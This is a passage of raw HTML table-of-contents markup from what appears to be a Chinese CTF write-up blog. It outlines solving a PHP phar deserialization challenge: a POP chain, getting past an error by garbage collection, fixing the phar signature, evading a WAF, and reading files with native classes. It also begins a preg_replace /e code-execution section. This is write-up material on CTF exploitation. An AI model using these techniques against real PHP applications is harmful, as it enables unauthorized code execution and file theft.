6%B3%95destruct%E5%92%8Cwakeup%E6%97%A0%E6%B3%95%E8%A7%A6%E5%8F%91%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%A6%81%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%8A%9B%E5%87%BA%E9%94%99%E8%AF%AF%E4%B9%8B%E5%89%8D%E5%B0%86%E6%88%91%E4%BB%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%B1%BB%E5%9B%9E%E6%94%B6%E6%8E%89%EF%BC%8C%E8%BF%99%E4%BE%BF%E6%98%AFGC%EF%BC%88%E5%9E%83%E5%9C%BE%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6%EF%BC%89"><span class="toc-number">15.0.3.</span> <span class="toc-text">不过在尝试性传入几个参数时发现网页最后一直报错，这才注意到最后的一句throw new Error(“start”);，这句话的作用就是抛出一个错误，而代码在遇到这个错误时便不再进行，进而导致我们的魔术方法destruct和wakeup无法触发，所以我们要在代码抛出错误之前将我们反序列化的类回收掉，这便是GC（垃圾处理机制）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E5%B0%86%E6%95%B0%E7%BB%84%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%85%83%E7%B4%A0%E8%AE%BE%E7%BD%AE%E4%B8%BA%E6%88%91%E4%BB%AC%E6%83%B3%E8%A6%81%E5%9B%9E%E6%94%B6%E7%9A%84%E5%AF%B9%E8%B1%A1%EF%BC%8C%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%85%83%E7%B4%A0%E8%AE%BE%E7%BD%AE%E4%B8%BA0%EF%BC%8C%E5%86%8D%E8%BF%9B%E8%A1%8C%E5%BA%8F%E5%88%97%E5%8C%96%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%B2%E5%BD%A2%E5%A6%82a-2-i-0-O-1-B-0-i-1-i-0-%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E%E4%B8%80%E4%B8%8B%E8%BF%99%E9%87%8C%E9%9D%A2%E7%9A%84%E5%80%BC%E5%AF%B9%E5%BA%94%E7%9A%84%E5%90%AB%E4%B9%89%EF%BC%9A%E5%8C%85%E5%90%AB2%E4%B8%AA%E5%85%83%E7%B4%A0%E7%9A%84%E6%95%B0%E7%BB%84-%E5%BA%8F%E5%8F%B7%E4%B8%BA0%E5%85%83%E7%B4%A0%E6%98%AFB%E7%B1%BB%E7%9A%84%E5%AF%B9%E8%B1%A1%EF%BC%8C%E9%95%BF%E5%BA%A6%E4%B8%BA0%EF%BC%9A-%E6%B2%A1%E6%9C%89%E5%85%83%E7%B4%A0-%EF%BC%9B%E5%BA%8F%E5%8F%B7%E4%B8%BA1%E7%9A%84%E5%85%83%E7%B4%A0%E6%98%AFint%E5%9E%8B%E5%8F%98%E9%87%8F%E5%80%BC%E4%B8%BA0-%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E4%BB%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%B0%86%E5%BA%8F%E5%8F%B71%E6%94%B9%E4%B8%BA%E5%BA%8F%E5%8F%B70%EF%BC%8C%E5%BD%A2%E6%88%90a-2-i-0-O-1-B-0-i-0-i-0-%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%AF%BC%E8%87%B4%E5%BA%8F%E5%8F%B7%E4%B8%BA1%E7%9A%84%E5%85%83%E7%B4%A0%E5%8F%98%E4%B8%BA%E4%BA%86null%EF%BC%8C%E8%A7%A6%E5%8F%91GC%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87throw-new-Error-%E2%80%9Cstart%E2%80%9D-%E4%BA%86"><span class="toc-number">15.0.4.</span> <span class="toc-text">这里我们可以利用将数组的第一个元素设置为我们想要回收的对象，第二个元素设置为0，再进行序列化得到一串形如a:2{i:0;O:1:&quot;B&quot;:0:{}i:1;i:0;}的字符串，详细说明一下这里面的值对应的含义：包含2个元素的数组{序号为0元素是B类的对象，长度为0：{没有元素}；序号为1的元素是int型变量值为0}，这里我们就可以将序号1改为序号0，形成a:2{i:0;O:1:&quot;B&quot;:0:{}i:0;i:0;}，这样就导致序号为1的元素变为了null，触发GC，这样就可以绕过throw new Error(“start”);了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A5%E4%B8%8B%E6%9D%A5%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%8E%BB%E6%9E%84%E9%80%A0phar%E4%BA%86%EF%BC%8Cphar%E5%85%AB%E8%82%A1%E6%96%87%EF%BC%9A"><span class="toc-number">15.0.5.</span> <span class="toc-text">接下来就可以去构造phar了，phar八股文：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E7%9A%84-o%E4%BE%BF%E6%98%AF%E6%88%91%E4%BB%AC%E6%AD%A3%E5%B8%B8%E8%A6%81%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%B1%BB%EF%BC%8C%E5%9C%A8%E7%94%9F%E6%88%90phar%E6%97%B6%E4%BC%9A%E8%87%AA%E5%8A%A8%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8C%E5%9C%A8%E8%BF%99%E4%B8%80%E6%AE%B5%E4%BB%A3%E7%A0%81%E4%B8%8A%E9%9D%A2%E6%94%BE%E4%B8%8A%E6%88%91%E4%BB%AC%E6%83%B3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%B1%BB%E5%B9%B6%E6%9E%84%E9%80%A0pop%E9%93%BE%EF%BC%8C%E4%BE%BF%E5%8F%AF%E4%BB%A5%E5%9C%A8file-get-contents%E6%97%B6%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%BF%98%E8%A6%81%E5%85%88%E6%9E%84%E9%80%A0%E7%BB%88%E7%82%B9%E4%B8%BAecho-new-p-value-%E7%9A%84pop%E9%93%BE"><span class="toc-number">15.0.6.</span> <span class="toc-text">这里的$o便是我们正常要序列化的类，在生成phar时会自动序列化，在这一段代码上面放上我们想反序列化的类并构造pop链，便可以在file_get_contents时进行反序列化了，所以我们还要先构造终点为echo new $p($value)的pop链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E6%88%91%E4%BB%AC%E5%85%88%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="toc-number">15.0.7.</span> <span class="toc-text">首先我们先了解一下原生类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%BB%99%E4%BA%86%E6%88%91%E4%BB%ACflag%E5%9C%A8-%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E5%85%88%E9%81%8D%E5%8E%86%E5%90%8E%E8%AF%BB%E5%8F%96%E7%9A%84%E6%96%B9%E5%BC%8F%E8%8E%B7%E5%BE%97flag"><span class="toc-number">15.0.8.</span> <span class="toc-text">题目给了我们flag在&#x2F;，所以我们可以利用先遍历后读取的方式获得flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A5%E4%B8%8B%E6%9D%A5%E5%B0%B1%E6%98%AF%E6%89%BEpop%E9%93%BE%E4%BA%86%EF%BC%8C%E6%9C%80%E5%90%8E%E8%A6%81%E5%88%B0air%E7%B1%BB%E7%9A%84-set%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%A6%81%E5%AE%9A%E4%B9%89air%E7%B1%BB%E9%87%8C%E9%9D%A2%E7%9A%84%E5%8F%98%E9%87%8F%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E6%89%BE%E7%AD%89%E5%8F%B7%E5%B7%A6%E8%BE%B9%E6%9C%89%E5%A4%9A%E4%B8%AA%E7%AE%AD%E5%A4%B4%E7%9A%84%EF%BC%8C%E6%AD%A3%E5%A5%BDapple%E7%9A%84-get%E6%BB%A1%E8%B6%B3%E6%9D%A1%E4%BB%B6%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%B0%86-this-xxx-flag-this-flag-%E8%BF%99%E9%87%8C%E9%9D%A2%E7%9A%84xxx%E5%AE%9A%E4%B9%89%E4%B8%BAair%E7%B1%BB%E5%8D%B3%E5%8F%AF"><span class="toc-number">15.0.9.</span> <span class="toc-text">接下来就是找pop链了，最后要到air类的__set，所以我们要定义air类里面的变量，也就是找等号左边有多个箭头的，正好apple的__get满足条件，所以我们将$this-&gt;xxx-&gt;$flag &#x3D; $this-&gt;flag; 这里面的xxx定义为air类即可</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E5%B0%B1%E6%98%AF%E8%A7%A6%E5%8F%91-get%E4%BA%86%EF%BC%8C%E6%88%91%E4%BB%AC%E8%A6%81%E8%B0%83%E7%94%A8%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F%EF%BC%8C%E6%89%80%E4%BB%A5%E6%89%BE%E7%AD%89%E5%8F%B7%E5%8F%B3%E8%BE%B9%E5%B8%A6%E5%A4%9A%E4%B8%AA%E7%AD%89%E5%8F%B7%E7%9A%84%EF%BC%8Ctree%E7%9A%84-call%E9%87%8C%E9%9D%A2%E6%9C%89%EF%BC%8Cair%E7%B1%BB%E7%9A%84-set%E4%B9%9F%E6%9C%89%EF%BC%8C%E4%BD%86air%E7%B1%BB%E7%9A%84-set%E6%98%AF%E6%88%91%E4%BB%AC%E7%9A%84%E7%BB%88%E7%82%B9%EF%BC%8C%E6%89%80%E4%BB%A5%E6%98%AF%E5%88%A9%E7%94%A8tree%E7%9A%84-call%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%A6%81%E5%B0%86-arg-1-this-name-name%E9%87%8C%E9%9D%A2%E7%9A%84name%E8%AE%BE%E7%BD%AE%E4%B8%BAapple%E7%B1%BB"><span class="toc-number">15.0.10.</span> <span class="toc-text">然后就是触发__get了，我们要调用成员变量，所以找等号右边带多个等号的，tree的__call里面有，air类的__set也有，但air类的__set是我们的终点，所以是利用tree的__call，所以我们要将$arg[1] &#x3D;$this-&gt;name-&gt;$name里面的name设置为apple类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E5%B0%B1%E6%98%AFtree%E7%9A%84tree%E7%9A%84-call%E7%9A%84%E8%A7%A6%E5%8F%91%E4%BA%86%EF%BC%8C%E8%A6%81%E5%9C%A8%E5%AF%B9%E8%B1%A1%E4%B8%AD%E8%B0%83%E7%94%A8%E4%B8%80%E4%B8%AA%E4%B8%8D%E5%8F%AF%E8%AE%BF%E9%97%AE%E6%96%B9%E6%B3%95%E6%97%B6%E8%B0%83%E7%94%A8%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E6%89%BE%E4%B8%AA%E5%B8%A6%E6%8B%AC%E5%8F%B7%E7%9A%84%EF%BC%8C%E5%88%9A%E5%A5%BDtree%E7%9A%84-destruct%E5%B0%B1%E6%9C%89%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%B0%86name%E5%AE%9A%E4%B9%89%E4%B8%BA%E4%B8%80%E4%B8%AA%E6%9C%AA%E5%AE%9A%E4%B9%89%E7%9A%84%E5%87%BD%E6%95%B0%E5%8D%B3%E5%8F%AF%EF%BC%8C%E6%AD%A3%E5%A5%BD%E5%88%9A%E5%88%9A%E6%88%91%E4%BB%AC%E8%A6%81%E5%B0%86name%E5%AE%9A%E4%B9%89%E4%B8%BA%E5%AF%B9%E8%B1%A1%EF%BC%8C%E8%BF%99%E6%A0%B7%E9%93%BE%E5%AD%90%E5%B0%B1%E6%89%BE%E5%88%B0%E4%BA%86"><span class="toc-number">15.0.11.</span> <span class="toc-text">最后就是tree的tree的__call的触发了，要在对象中调用一个不可访问方法时调用，也就是找个带括号的，刚好tree的__destruct就有，所以我们将name定义为一个未定义的函数即可，正好刚刚我们要将name定义为对象，这样链子就找到了</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tree%E7%9A%84-destruct-tree%E7%9A%84-call-apple%E7%9A%84-get-air%E7%B1%BB%E7%9A%84-set"><span class="toc-number">15.1.</span> <span class="toc-text">tree的__destruct-&gt;tree的__call-&gt;apple的__get-&gt;air类的__set</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E5%B0%B1%E6%98%AF%E6%9C%80%E7%BB%88%E5%8F%82%E6%95%B0%E7%9A%84%E7%A1%AE%E5%AE%9A%EF%BC%8C%E6%88%91%E4%BB%AC%E8%A6%81%E6%89%A7%E8%A1%8CDirectoryIterator%EF%BC%88glob-f-%EF%BC%89%EF%BC%8C%E6%89%80%E4%BB%A5-set-p-value-%E9%87%8C%E9%9D%A2%E7%9A%84-p%E8%A6%81%E4%B8%BADirectoryIterator%EF%BC%8C-value%E8%A6%81%E4%B8%BAglob-f-%EF%BC%8C%E5%90%8C%E6%97%B6%E5%8F%88%E5%9B%A0%E4%B8%BA-p-this-p-act-%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%BF%98%E8%A6%81%E5%AE%9A%E4%B9%89%E4%B8%80%E4%B8%AAair%E7%B1%BB%E6%9D%A5%E5%B0%86p%E5%AE%9A%E4%B9%89%E4%B8%BA%E5%94%AF%E4%B8%80%E4%B8%80%E4%B8%AA%E6%9C%89act%E5%85%83%E7%B4%A0%E7%9A%84%E7%B1%BBtree%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%86%E8%B0%83%E7%94%A8set%E6%97%B6%E8%AE%BE%E5%AE%9A%E7%9A%84%E5%80%BC%E4%B9%9F%E5%B0%B1%E6%98%AF-this-xxx-flag-this-flag-%E9%87%8C%E9%9D%A2%E7%9A%84flag%E8%AE%BE%E7%BD%AE%E4%B8%BAglob-f-%EF%BC%8C%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%97%B6%E6%94%B9DirectoryIterator%E4%B8%BASplFileObject%EF%BC%8Cglob-f-%E4%B8%BA%E6%96%87%E4%BB%B6%E5%90%8D%E5%8D%B3%E5%8F%AF"><span class="toc-number">15.1.1.</span> <span class="toc-text">然后就是最终参数的确定，我们要执行DirectoryIterator（glob:&#x2F;&#x2F;f*），所以__set($p, $value)里面的$p要为DirectoryIterator，$value要为glob:&#x2F;&#x2F;f*，同时又因为$p &#x3D; $this-&gt;p-&gt;act; ，所以我们还要定义一个air类来将p定义为唯一一个有act元素的类tree，然后将调用set时设定的值也就是$this-&gt;xxx-&gt;$flag &#x3D; $this-&gt;flag; 里面的flag设置为glob:&#x2F;&#x2F;f*，文件读取时改DirectoryIterator为SplFileObject，glob:&#x2F;&#x2F;f*为文件名即可</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E4%B8%BA%E4%BA%86%E9%98%B2%E6%AD%A2%E6%89%BEpop%E9%93%BE%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E5%90%8E%E9%9D%A2%E5%87%BA%E9%94%99%E6%89%80%E4%BB%A5%E5%85%88%E8%87%AA%E5%B7%B1%E6%90%AD%E4%BA%86%E4%B8%80%E4%B8%AA%E9%83%A8%E5%88%86%E7%8E%AF%E5%A2%83%E6%A3%80%E9%AA%8C%E4%BA%86%E4%B8%80%E4%B8%8B"><span class="toc-number">15.1.2.</span> <span class="toc-text">这里为了防止找pop链出现错误导致后面出错所以先自己搭了一个部分环境检验了一下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90phar%E5%90%8E%E8%BF%98%E8%A6%81%E6%B3%A8%E6%84%8F%E6%88%91%E4%BB%AC%E8%A6%81%E8%AE%A9phar%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%9F%E8%83%BD%E7%BB%95%E8%BF%87throw-new-Error-%E2%80%9Cstart%E2%80%9D-%EF%BC%8C%E6%89%80%E4%BB%A5%E8%A6%81%E7%94%A8010%E6%89%93%E5%BC%80%E5%8E%BB%E6%8E%89%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA-%E6%9D%A5%E8%A7%A6%E5%8F%91GC%EF%BC%88%E4%B8%8D%E5%A4%AA%E7%90%86%E8%A7%A3%EF%BC%8C%E7%BD%91%E4%B8%8A%E7%9A%84WP%E4%B9%9F%E5%B0%91%E6%9C%89%E8%A7%A3%E9%87%8A%EF%BC%89%E4%BD%86%E6%98%AFphar%E6%96%87%E4%BB%B6%E5%86%85%E8%BF%98%E6%9C%89%E7%AD%BE%E5%90%8D%EF%BC%8C%E6%88%91%E4%BB%AC%E6%94%B9%E5%8A%A8%E5%90%8E%E4%BC%9A%E5%AF%BC%E8%87%B4%E7%AD%BE%E5%90%8D%E4%B8%8D%E7%AC%A6%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%A6%81%E9%87%8D%E6%96%B0%E7%94%9F%E6%88%90%E4%B8%80%E6%AC%A1%E7%AD%BE%E5%90%8D"><span class="toc-number">15.1.3.</span> <span class="toc-text">生成phar后还要注意我们要让phar的反序列化也能绕过throw new Error(“start”)，所以要用010打开去掉最后一个}来触发GC（不太理解，网上的WP也少有解释）但是phar文件内还有签名，我们改动后会导致签名不符，所以我们要重新生成一次签名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E6%9C%89%E4%B8%80%E4%B8%AA%E5%8D%A1%E4%BA%86%E6%88%91%E4%B8%80%E5%A4%A9%E7%9A%84%E5%9C%B0%E6%96%B9%EF%BC%8C%E7%BD%91%E4%B8%8A%E7%9A%84%E8%84%9A%E6%9C%AC%E5%87%A0%E4%B9%8E%E5%85%A8%E6%98%AFsha1%E5%8A%A0%E5%AF%86%E7%94%9F%E6%88%90%E7%AD%BE%E5%90%8D%EF%BC%8C%E4%BD%86%E6%98%AF%E5%AE%9E%E9%99%85%E4%B8%8A%E5%9C%A8php%E5%AE%98%E7%BD%91%E4%B8%8A%E6%9C%89%E8%AF%A6%E7%BB%86%E4%BB%8B%E7%BB%8Dphar%E7%9A%84%E7%AD%BE%E5%90%8D%E6%9C%BA%E5%88%B6%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%9C%89MD5%EF%BC%8Csha1%EF%BC%8Csha256%EF%BC%8Csha512%E4%B8%8D%E5%90%8C%E7%9A%84%E7%AD%BE%E5%90%8D%E6%96%B9%E5%BC%8F%EF%BC%8C%E5%90%8C%E6%97%B6%E5%9C%A8%E6%96%87%E4%BB%B6%E7%9A%84%E5%80%92%E6%95%B05%E5%88%B08%E4%B8%AA%E5%AD%97%E8%8A%82%E9%80%86%E5%90%91%E5%88%86%E5%88%AB%E7%94%A80x0001%EF%BC%8C0x0002-0x0003-0x0004%E4%BB%A3%E6%8C%87%E5%AF%B9%E5%BA%94%E7%9A%84%E7%AD%BE%E5%90%8D%E6%96%B9%E6%B3%95%EF%BC%8C%E5%8F%AF%E8%83%BD%E6%98%AF%E7%89%88%E6%9C%AC%E8%BF%AD%E4%BB%A3%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%8C%E6%88%91%E4%BB%AC%E7%94%9F%E6%88%90%E7%9A%84phar%E4%B8%BA03%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AFsha256%E5%8A%A0%E5%AF%86%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%AF%BC%E8%87%B4%E6%88%91%E4%BB%AC%E7%9A%84%E8%84%9A%E6%9C%AC%E4%B8%8E%E6%88%91%E4%BB%AC%E7%9A%84%E6%96%87%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E4%B8%8D%E5%90%8C%EF%BC%8C%E5%AF%BC%E8%87%B4%E7%AD%BE%E5%90%8D%E6%8D%9F%E5%9D%8F%E3%80%82"><span class="toc-number">15.1.4.</span> <span class="toc-text">这里有一个卡了我一天的地方，网上的脚本几乎全是sha1加密生成签名，但是实际上在php官网上有详细介绍phar的签名机制，可以有MD5，sha1，sha256，sha512不同的签名方式，同时在文件的倒数5到8个字节逆向分别用0x0001，0x0002,0x0003,0x0004代指对应的签名方法，可能是版本迭代的原因，我们生成的phar为03，也就是sha256加密，这样就导致我们的脚本与我们的文件加密方式不同，导致签名损坏。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E9%9D%A2%E7%9A%84%E6%8A%A5%E9%94%99%E4%B9%9F%E6%98%AF%E8%AF%81%E6%98%8E%E4%BA%86%E8%BF%99%E4%B8%80%E7%82%B9"><span class="toc-number">15.1.5.</span> <span class="toc-text">下面的报错也是证明了这一点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%A6%81%E5%B0%86%E6%88%91%E4%BB%AC%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%8403%E6%94%B9%E4%B8%BA02%EF%BC%8C%E8%BF%99%E6%A0%B7%E6%88%91%E4%BB%AC%E7%9A%84%E8%84%9A%E6%9C%AC%E4%B8%8E%E7%AD%BE%E5%90%8D%E5%B0%B1%E6%98%AF%E5%AF%B9%E5%BA%94%E7%9A%84%E4%BA%86"><span class="toc-number">15.1.6.</span> <span class="toc-text">所以我们要将我们文件中的03改为02，这样我们的脚本与签名就是对应的了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%A5%BD%E5%90%8E%E8%BF%9B%E8%A1%8Curl%E7%BC%96%E7%A0%81%E6%9D%A5%E7%94%A8file-put-contents%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="toc-number">15.1.7.</span> <span class="toc-text">生成好后进行url编码来用file_put_contents写入文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E7%9A%84%E5%90%8C%E6%97%B6%E8%BF%98%E8%A6%81%E7%94%A8GC%E5%9B%9E%E6%94%B6%E5%9E%83%E5%9C%BE%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%EF%BC%8C%E6%89%80%E4%BB%A5%E8%BF%98%E8%A6%81%E7%BB%991%E8%BF%99%E4%B8%AA%E5%8F%82%E6%95%B0%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">15.1.8.</span> <span class="toc-text">上传的同时还要用GC回收垃圾机制绕过，所以还要给1这个参数序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B91%E4%B8%BA0%EF%BC%8Ca-2-i-0-O-1-D-1-s-5-start-s-1-r-i-0-i-0-%EF%BC%8C%E5%86%99%E5%85%A5%E4%B8%BAw%EF%BC%8C%E8%AF%BB%E5%8F%96%E6%94%B9%E4%B8%BA%E4%B8%BAr"><span class="toc-number">15.1.9.</span> <span class="toc-text">改1为0，a:2:{i:0;O:1:&quot;D&quot;:1:{s:5:&quot;start&quot;;s:1:&quot;r&quot;;}i:0;i:0;}，写入为w，读取改为为r</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E8%BF%87%E4%B8%8A%E4%BC%A0%E5%90%8E%E5%8F%91%E7%8E%B0waf%E5%87%BD%E6%95%B0%E8%A7%A6%E5%8F%91%EF%BC%8C%E5%8E%9F%E6%9D%A5%E6%98%AF%E6%88%91%E4%BB%AC%E7%9A%84phar%E9%87%8C%E9%9D%A2%E5%90%AB%E6%9C%89php%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E5%8E%8B%E7%BC%A9%E7%BB%95%E8%BF%87"><span class="toc-number">15.1.10.</span> <span class="toc-text">不过上传后发现waf函数触发，原来是我们的phar里面含有php，所以可以利用压缩绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%8B%E7%BC%A9%E5%90%8E%E5%86%8Durl%E7%BC%96%E7%A0%81%E8%BF%9B%E8%A1%8C%E4%B8%8A%E4%BC%A0%E5%8D%B3%E5%8F%AF%E7%BB%95%E8%BF%87%EF%BC%8C%E7%84%B6%E5%90%8E%E5%86%8D%E7%94%A8phar%E8%AF%BB%E5%8F%96%E5%9B%9E%E6%98%BE%E7%9A%84%E8%B7%AF%E5%BE%84%E5%8D%B3%E5%8F%AF"><span class="toc-number">15.1.11.</span> <span class="toc-text">压缩后再url编码进行上传即可绕过，然后再用phar读取回显的路径即可</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E8%BF%98%E6%9C%89%E4%B8%80%E4%B8%AA%E5%8F%88%E5%8D%A1%E4%BA%86%E6%88%91%E5%8D%8A%E5%A4%A9%E7%9A%84%E5%9C%B0%E6%96%B9%EF%BC%8C%E5%B0%B1%E6%98%AF%E7%81%AB%E7%8B%90%E7%9A%84hackbar%E6%8F%92%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%97%B6%E5%8F%AF%E8%83%BD%E5%B9%B6%E6%B2%A1%E6%9C%89%E8%BF%9B%E8%A1%8Curl%E8%A7%A3%E7%A0%81%EF%BC%8C%E6%89%80%E4%BB%A5%E5%AF%BC%E8%87%B4%E6%88%91%E7%94%A8%E7%81%AB%E7%8B%90%E4%B8%8A%E4%BC%A0%E6%97%B6%E4%B8%80%E7%9B%B4%E6%8A%A5%E9%94%99%EF%BC%8C%E6%8D%A2%E6%88%90BP%E5%90%8E%E5%B0%B1%E5%A5%BD%E4%BA%86%EF%BC%88%E8%8B%A6%E5%91%80%E8%A5%BF%EF%BC%89"><span class="toc-number">15.1.12.</span> <span class="toc-text">这里还有一个又卡了我半天的地方，就是火狐的hackbar插件上传时可能并没有进行url解码，所以导致我用火狐上传时一直报错，换成BP后就好了（苦呀西）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84RCE"><span class="toc-number">16.</span> <span class="toc-text">简单的RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%A1%E6%9C%89%E7%8E%AF%E5%A2%83%EF%BC%8C%E5%9C%A8%E6%9C%AC%E4%BD%93%E6%8A%8A%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B7%91%E8%B5%B7%E6%9D%A5%EF%BC%8C%E9%A6%96%E5%85%88%E5%85%88-GET-moran-flag-%EF%BC%8C%E9%9D%9E%E5%B8%B8%E7%AE%80%E5%8D%95%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%B1%E5%9C%A8%E7%BD%91%E9%A1%B5%E7%9C%8B%E5%88%B0%E4%BB%A3%E7%A0%81%E4%BA%86%EF%BC%8C%E6%8E%A5%E4%B8%8B%E6%9D%A5%E5%B0%B1%E6%98%AF%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8preg-replace%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%BA%86"><span class="toc-number">16.0.1.</span> <span class="toc-text">没有环境，在本体把服务器跑起来，首先先$_GET[&#39;moran&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;，非常简单，然后就在网页看到代码了，接下来就是过滤绕过以及利用preg_replace进行代码执行了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#preg-replace%E5%A6%82%E6%9E%9C%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0%E6%98%AF-e%E6%A8%A1%E5%BC%8F%EF%BC%8C%E5%B0%B1%E4%BC%9A%E5%9C%A8%E6%9B%BF%E6%8D%A2%E6%97%B6%E5%B0%86%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%8F%82%E6%95%B0%E5%BD%93%E5%81%9A%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%8C%E7%84%B6%E5%90%8E-i%E6%A8%A1%E5%BC%8F%E6%98%AF%E5%A4%A7%E5%B0%8F%E5%86%99%E4%B8%8D%E6%95%8F%E6%84%9F%EF%BC%8C%E6%89%80%E4%BB%A5%E8%BF%99%E9%87%8C%E7%9B%B4%E6%8E%A5%E5%B0%86%E7%AC%AC%E4%B8%89%E4%B8%AA%E5%8F%82%E6%95%B0%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87%E5%8D%B3%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%9B%BF%E6%8D%A2"><span class="toc-number">16.0.2.</span> <span class="toc-text">preg_replace如果第一个参数是&#x2F;e模式，就会在替换时将第二个参数当做代码执行，然后&#x2F;i模式是大小写不敏感，所以这里直接将第三个参数大小写绕过即可执行替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 